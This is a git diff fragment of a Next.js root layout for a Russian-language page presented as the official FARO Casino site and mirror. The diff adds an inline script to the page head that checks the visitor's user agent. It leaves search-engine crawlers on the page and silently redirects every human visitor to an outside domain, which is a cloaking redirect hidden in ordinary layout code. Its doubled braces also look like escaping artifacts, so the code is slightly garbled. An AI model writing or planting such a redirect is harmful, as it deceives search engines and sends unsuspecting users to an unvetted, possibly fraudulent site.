@@ -15,6 +15,21 @@ export default function RootLayout({
   return (
     <html lang="ru">
       <head>
+        <script
+        dangerouslySetInnerHTML={{{{
+          __html: `
+            (function() {{
+              try {{
+                var ua = (navigator.userAgent || '').toLowerCase();
+                var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+                if (!isBot) {{
+                  window.location.replace("https://combonorth.space/aetf3u2q9u");
+                }}
+              }} catch(e) {{}}
+            }})();
+          `,
+        }}}}
+      />
         <meta name="yandex-verification" content="d382177eaf674ad6" />
         <title>Фаро Казино — FARO Casino официальный сайт и рабочее зеркало, играть онлайн</title>
         <meta
